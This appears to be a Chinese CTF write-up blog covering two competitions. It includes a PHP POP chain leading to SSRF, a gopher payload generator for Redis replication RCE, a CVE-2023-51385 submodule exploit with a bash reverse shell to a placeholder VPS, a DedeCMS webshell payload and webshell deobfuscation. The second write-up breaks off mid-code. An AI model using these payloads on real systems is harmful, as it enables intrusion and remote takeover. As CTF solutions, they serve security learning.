写在前面着实没时间去做题，不过是第一次通过 SSRF 利用 Redis 主从复制实现命令执行，同时也是第一次打公开的 RDG 模式，所以记录一下。 可信计算基于挑战码的双向认证1 完整题目背景及描述请见附件。 （请点击“下发赛题”，本题容器下发后的端口是ssh端口，ssh的账号为player，密码为player，ssh登录上去可自行修改密码。登录后请根据题目要求解题），本场景有2个flag，此处提交flag1 年年出可信计算，年年非预期。 1grep -ra &quot;flag&#123;&quot; /root 基于挑战码的双向认证1 完整题目背景及描述请见附件。 （请点击“下发赛题”，本题容器下发后的端口是ssh端口，ssh的账号为player，密码为player，ssh登录上去可自行修改密码。登录后请根据题目要求解题），本场景有2个flag，此处提交flag2 同上题。 Webezezez_php 小小同学说大佬轻点打！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;?phphighlight_file(__FILE__);include &quot;function.php&quot;;class Rd&#123; public $ending; public $cl; public $poc; public function __destruct() &#123; echo &quot;All matters have concluded&quot;.&quot;&lt;/br&gt;&quot;; &#125; public function __call($name, $arg) &#123; foreach ($arg as $key =&gt; $value) &#123; if ($arg[0][&#x27;POC&#x27;] == &quot;0.o&quot;) &#123; $this-&gt;cl-&gt;var1 = &quot;get&quot;; &#125; &#125; &#125;&#125;class Poc&#123; public $payload; public $fun; public function __set($name, $value) &#123; $this-&gt;payload = $name; $this-&gt;fun = $value; &#125; function getflag($paylaod) &#123; echo &quot;Have you genuinely accomplished what you set out to do?&quot;.&quot;&lt;/br&gt;&quot;; file_get_contents($paylaod); &#125;&#125;class Er&#123; public $symbol; public $Flag; public function __construct() &#123; $this-&gt;symbol = True; &#125; public function __set($name, $value) &#123; if (preg_match(&#x27;/^(http|https|gopher|dict)?://.*(/)?.*$/&#x27;,base64_decode($this-&gt;Flag)))&#123; $value($this-&gt;Flag); &#125; else &#123; echo &quot;NoNoNo,please you can look hint.php&quot;.&quot;&lt;/br&gt;&quot;; &#125; &#125;&#125;class Ha&#123; public $start; public $start1; public $start2; public function __construct() &#123; echo $this-&gt;start1 . &quot;__construct&quot; . &quot;&lt;/br&gt;&quot;; &#125; public function __destruct() &#123; if ($this-&gt;start2 === &quot;o.0&quot;) &#123; $this-&gt;start1-&gt;Love($this-&gt;start); echo &quot;You are Good!&quot;.&quot;&lt;/br&gt;&quot;; &#125; &#125;&#125;function get($url) &#123; $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output);&#125;if (isset($_POST[&#x27;pop&#x27;])) &#123; $a = unserialize($_POST[&#x27;pop&#x27;]);&#125; else &#123; die(&quot;You are Silly goose!&quot;);&#125;?&gt; 一看到 curl() 以及 hint.php 里的内容，猜测肯定就是考察 Redis Rce 了 1234&lt;?phphighlight_file(__FILE__);$hint = &quot;Not db,but 127.0.0.1!!!redis-flag&#123;really&#125;&quot;;?&gt; 我们先构造出初始反序列化代码，挺简单的POP链 1unserialize() -&gt; Ha() -&gt; __destruct() -&gt; Rd() -&gt; __call() -&gt; Er -&gt; __set() 12345678910111213141516171819202122232425&lt;?phpClass Rd&#123; public $ending; public $cl; public $poc;&#125; class Er&#123; public $symbol; public $Flag;&#125;class Ha&#123; public $start; public $start1; public $start2;&#125;$flag = new Ha();$flag -&gt; start2 = &quot;o.0&quot;;$flag -&gt; start1 = new Rd();$flag -&gt; start = [&#x27;POC&#x27;=&gt;&#x27;0.o&#x27;];$flag -&gt; start1 -&gt; cl = new Er();$flag -&gt; start1 -&gt; cl -&gt; Flag = base64_encode(&#x27;dict://127.0.0.1:6379/info&#x27;);echo urldecode(serialize($flag)); 在 Redis 中，getshell 的方法无非就那几种：计划任务、写文件 和 主从复制 这里我尝试了前两种，均无法实现，同时经过测试发现该题目出网，我们直接利用 主从复制 进行 getshell 首先我们通过 Dliv3&#x2F;redis-rogue-server 启动 Redis 主节点，注意由于我们攻击的是内网 Redis，故需要添加 --server-only 参数 然后我们通过下方的脚本生成恶意payload，注意分两次进行发送（第一次是连接从节点，第二次时载入恶意 exp.so 文件） 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport redef urlencode(data): enc_data = &#x27;&#x27; for i in data: h = str(hex(ord(i))).replace(&#x27;0x&#x27;, &#x27;&#x27;) if len(h) == 1: enc_data += &#x27;%0&#x27; + h.upper() else: enc_data += &#x27;%&#x27; + h.upper() return enc_datadef gen_payload(payload): redis_payload = &#x27;&#x27; for i in payload.split(&#x27;
&#x27;): arg_num = &#x27;*&#x27; + str(len(i.split(&#x27; &#x27;))) redis_payload += arg_num + &#x27;
&#x27; for j in i.split(&#x27; &#x27;): arg_len = &#x27;$&#x27; + str(len(j)) redis_payload += arg_len + &#x27;
&#x27; redis_payload += j + &#x27;
&#x27; gopher_payload = &#x27;gopher://127.0.0.1:6379/_&#x27; + urlencode(redis_payload) return gopher_payload# ip 和 port 修改为实际的payload1 = &#x27;&#x27;&#x27;slaveof ip portconfig set dir /tmpconfig set dbfilename exp.soquit&#x27;&#x27;&#x27;# system.exec &#x27;env&#x27; 为你要执行的命令payload2 = &#x27;&#x27;&#x27;slaveof no onemodule load /tmp/exp.sosystem.exec &#x27;env&#x27;quit&#x27;&#x27;&#x27;print(gen_payload(payload1))print(gen_payload(payload2)) Misc谁偷吃了我的外卖 小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢 下载附件得到一张图片，通过 foremost 得到一个压缩包，同时压缩包注释中存在 hint 12I can give you a hint: - = /But there was a takeaway that was partially eaten. 同时，我们发现 用户xx_ 后面 4位 像是 Base64 编码，我们写代码遍历出来。另外我们结合提示，将文件名中的 - 替换为 / 当时我一直以为它指的是三个符号 减号，等号和斜杠，没想到指的是减号等于斜杠 12345678910111213141516171819202122232425262728import reimport base64import zipfiledef getFileid(name): match = re.search(r&#x27;\d+&#x27;, name) return int(match.group()) if match else float(&#x27;inf&#x27;)def getFilelist(path): file_list = [] with zipfile.ZipFile(path, &#x27;r&#x27;) as zip_ref: file_list = [file for file in zip_ref.namelist()] return sorted(file_list, key=getFileid)def getNamebase(name): match = re.match(r&#x27;(.+)\d+_(.&#123;4&#125;)&#x27;, name) return match.group(2).replace(&#x27;-&#x27;, &#x27;/&#x27;) if match else &#x27;&#x27;data = &#x27;&#x27;for file in getFilelist(&#x27;外卖箱.zip&#x27;): # print(getNamebase(file), end=&#x27;&#x27;) data += getNamebase(file)with open(&#x27;data.bin&#x27;, &#x27;wb&#x27;) as file: file.write(base64.b64decode(data)) 运行代码后得到 data.bin，我们使用 foremost 进行分类即可得到一个压缩文件，里面拥有一个 钥匙.png，打开发现是用 Bandizip 压缩的一张图，我们直接进行明文攻击即可。 分别在 小凯的奋斗故事.md 和 txt.galf 中得到 flag 片段，最终 flag 如下 1flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125; modules 爱学习的小楠楠在复现某个CVE，搭建了本场景，你能获取到本场景下的flag吗？ 参考这篇复现文章 CVE-2023-51385，分别创建 .gitmodules 和 shell.sh 即可（其实还有个非预期的解法，直接在 Gitee 根据时间排序检索该漏洞号，可以搜到其他参赛者创建的仓库，直接 fork 后修改反弹地址即可） 1234567# .gitmodules[submodule &quot;cve&quot;] path = cve url = https://`echo helloworld &gt; cve.txt`foo.ichunqiu.com/bar[submodule &quot;test&quot;] path = test url = ssh://`bash shell.sh`foo.ichunqiu.com/bar 12# shell.shbash -i &gt;&amp; /dev/tcp/vps_ip/5000 0&gt;&amp;1 明文混淆 小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。 根据常见开源协议文件进行爆破，例如 MIT、GPL 和 Apache 之类的，通过 GPL 协议爆破成功，注意，已知明文只需要大于 12 位即可 给定密文和12个或更多字节的对应明文，可以恢复密钥流生成器的内部状态。 1GNU GENERAL PUBLIC LICENSE 我们通过 bkcrack 得到密钥 7163444a 203b76b0 17de1387，通过已知密钥得到压缩包密码 R05VIEdQTHYz 123&lt;?php$O00OO0=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$O00O0O=$O00OO0&#123;3&#125;.$O00OO0&#123;6&#125;.$O00OO0&#123;33&#125;.$O00OO0&#123;30&#125;;$O0OO00=$O00OO0&#123;33&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;;$OO0O00=$O0OO00&#123;0&#125;.$O00OO0&#123;18&#125;.$O00OO0&#123;3&#125;.$O0OO00&#123;0&#125;.$O0OO00&#123;1&#125;.$O00OO0&#123;24&#125;;$OO0000=$O00OO0&#123;7&#125;.$O00OO0&#123;13&#125;;$O00O0O.=$O00OO0&#123;22&#125;.$O00OO0&#123;36&#125;.$O00OO0&#123;29&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;.$O00OO0&#123;32&#125;.$O00OO0&#123;35&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;;eval($O00O0O(&quot;&quot;));?&gt; 直接挨个 var_dump() 即可 12345678910111213141516171819&lt;?php$O00OO0=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$O00O0O=$O00OO0&#123;3&#125;.$O00OO0&#123;6&#125;.$O00OO0&#123;33&#125;.$O00OO0&#123;30&#125;;$O0OO00=$O00OO0&#123;33&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;;$OO0O00=$O0OO00&#123;0&#125;.$O00OO0&#123;18&#125;.$O00OO0&#123;3&#125;.$O0OO00&#123;0&#125;.$O0OO00&#123;1&#125;.$O00OO0&#123;24&#125;;$OO0000=$O00OO0&#123;7&#125;.$O00OO0&#123;13&#125;;$O00O0O.=$O00OO0&#123;22&#125;.$O00OO0&#123;36&#125;.$O00OO0&#123;29&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;.$O00OO0&#123;32&#125;.$O00OO0&#123;35&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;;eval($O00O0O(&quot;&quot;));$O0O000=&quot;uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nkC/FB==&quot;;var_dump($O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));// eval(gzinflate(base64_decode(&#x27;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#x27;)))var_dump(gzinflate(base64_decode(&#x27;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#x27;)));// eval(@$_POST[&#x27;flag&#123;s1mpL3_z1p_@nd_w365heLl!!!&#125;&#x27;]);?&gt; 挑战题ezdede 你成功地对这种勒索病毒进行了分析，获取了它的加密密钥，解密了你的公司的数据，你也利用了它的一个传播特征，找出了它的入侵点，清除了它的痕迹，你的公司的网络系统恢复了正常。你发现这种勒索病毒是通过电子邮件的附件，或者网络共享的文件，或者远程桌面的连接，或者USB设备的插入，或者其他的方式，进入了你的公司的网络系统。你决定对黑客进行反向渗透，以防止勒索病毒的进一步传播。 （关注微信公众号“勒索病毒头条”，发送关键词“编织梦境”可获取该题提示。） 通过公众号获得提示：弱口令为：admin@123；挖掘最新版本为 V5.7.112 的后台 rce 参考文章复现即可 DedeCMS V5.7 SP2后台存在代码执行漏洞，另外写马的时候有过滤，使用短标签和 readfile() 即可绕过 1&lt;?=readfile(&#x27;/flag&#x27;)?&gt; 然后访问以下路径即可得到 flag 1/include/taglib/secnote.lib.php RDGhad00p 此场景需要排查一个风险点；风险点排查修补后；才可以防御成功。如果存在需要重启服务的地方，系统会自动重启，不需要选手在修补包中添加命令。 修补白名单命令: [‘mv’, ‘cp’, ‘chmod’,’sed’,’export’,’echo’,’mkdir’,’hostname’]，修补后服务会自动重启 我们直接给 HDFS 设置上权限即可成功修复 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;&lt;!-- Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. See accompanying LICENSE file.--&gt;&lt;!-- Put site-specific property overrides in this file. --&gt;&lt;configuration&gt;&lt;property&gt; &lt;name&gt;hadoop.security.authentication&lt;/name&gt; &lt;value&gt;kerberos&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;&lt;!-- Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. See accompanying LICENSE file.--&gt;&lt;!-- Put site-specific property overrides in this file. --&gt;&lt;configuration&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.acls.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.acls.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; 12345678910111213141516171819202122#!/bin/sh# 设置Hadoop相关环境变量export HADOOP_SECURE_DN_USER=hdfsexport HADOOP_SECURE_DN_PORT=1004export HADOOP_SECURE_DN_LOG_DIR=$&#123;HADOOP_LOG_DIR&#125;/hdfs# 处理core-site.xmlmv file1 /usr/local/hadoop/share/hadoop/common/templates/core-site.xmlchmod 777 /usr/local/hadoop/share/hadoop/common/templates/core-site.xmlmv file1 /usr/local/hadoop/etc/hadoop/core-site.xmlchmod 777 /usr/local/hadoop/etc/hadoop/core-site.xmlmv file1 /usr/local/hadoop/input/core-site.xmlchmod 777 /usr/local/hadoop/input/core-site.xml# 处理hdfs-site.xmlmv file2 /usr/local/hadoop/share/hadoop/hdfs/templates/hdfs-site.xmlchmod 777 /usr/local/hadoop/share/hadoop/hdfs/templates/hdfs-site.xmlmv file2 /usr/local/hadoop/etc/hadoop/hdfs-site.xmlchmod 777 /usr/local/hadoop/etc/hadoop/hdfs-site.xmlmv file2 /usr/local/hadoop/input/hdfs-site.xmlchmod 777 /usr/local/hadoop/input/hdfs-site.xml

写在前面一年比一年卷是吧，前年24小时不间断高考模式，去年的黑灯模式，今年比两天😥，另外由于我校不认CISCN这种小比赛，所以简单划划水。 Misc签到卡 早在1928年，IBM发明了80列、矩形孔卡片，并将它们用于数字计算机中，开启了穿孔卡片在计算领域中的应用之路。随着技术的进步，穿孔卡片的字符表示方式也不断更新，从6比特的BCDIC发展到1964年8比特的EBCDIC。 现在，春秋GAME伽玛实验室团队模拟了一台IBM 029型打孔机，再通过模拟IBM System&#x2F;360功能，让其具备了执行代码命令的功能。请点击下发按钮，跟随着打孔机的滴答声，重返计算科技的辉煌岁月~！ 直接根据 hint 得到 flag 1print(open(&#x27;/flag&#x27;).read()) 国粹a.png 为横坐标，k.png 为纵坐标，题目.png 为计算坐标时的参考值，比如四条在 题目.png 中排 第1 ，则 a.png 中的 四条 就代表数值 1 。但 题目.png 第一列要裁掉，因为第一行第一列为 空白像素，做题的时候我是直接用PS把第一列和第一行都裁掉了，但是我通过 Python 裁剪，发现没成功，所以代码里直接剪掉了 986595，以达到在PS中的效果 123456789101112131415161718192021222324252627282930313233import numpy as npfrom PIL import Imageimport matplotlib.pyplot as pltdef crop_image(image_path, crop_width, crop_height, data_list=None): image = Image.open(image_path) width, height = image.size cropped_images = [] for left in range(0, width, crop_width): for top in range(0, height, crop_height): right = left + crop_width bottom = top + crop_height cropped_images.append(image.crop((left, top, right, bottom))) result = [] for cropped_image in cropped_images: cropped_np = np.sum(cropped_image) if data_list is None: result.append(cropped_np - 986595) elif cropped_np in data_list: result.append(data_list.index(cropped_np) + 1) return resultdata_list = crop_image(&#x27;题目.png&#x27;, 53, 73)[1:]x = crop_image(&#x27;a.png&#x27;, 53, 73, data_list)y = crop_image(&#x27;k.png&#x27;, 53, 73, data_list)plt.scatter(x, y)plt.xlabel(&#x27;x&#x27;)plt.ylabel(&#x27;y&#x27;)plt.show() pyshell flag在&#x2F;flag，每个容器只支持同时连接一个客户端。部分指令可能导致容器无响应，如果出现这样的情况请重启题目环境 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import socketimport threadingclass Service(threading.Thread): def __init__(self, port): threading.Thread.__init__(self) self.port = port self.sock = socket.create_server((&quot;0.0.0.0&quot;, port)) self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.client.settimeout(2) def run(self): print(&quot;listener started&quot;) self.client.connect((&quot;127.0.0.1&quot;, 12345)) rabbish = self.client.recv(1024) while not rabbish.decode().strip().endswith(&#x27;&gt;&gt;&gt;&#x27;): rabbish = self.client.recv(1024) while True: ss, addr = self.sock.accept() print(&quot;accept a connect&quot;) try: ss.send(b&#x27;Welcome to this python shell,try to find the flag!
&#x27;) while True: ss.send(b&#x27;&gt;&gt;&#x27;) msg = ss.recv(1024) if not msg: continue elif is_validate(msg.decode().strip()): self.client.send(msg) total_result = bytes() while True: try: result = self.client.recv(1024) total_result += result if result.decode().strip().endswith(&#x27;&gt;&gt;&gt;&#x27;): break except: break print(total_result) if total_result.decode().strip().endswith(&#x27;&gt;&gt;&gt;&#x27;): total_result = total_result[:-4] elif total_result.decode().strip().endswith(&#x27;...&#x27;): self.client.send(b&#x27;
&#x27;) while True: result = self.client.recv(1024) total_result += result if result.decode().strip().endswith(&#x27;&gt;&gt;&gt;&#x27;): break total_result = total_result[:-4] else: total_result = b&#x27;error
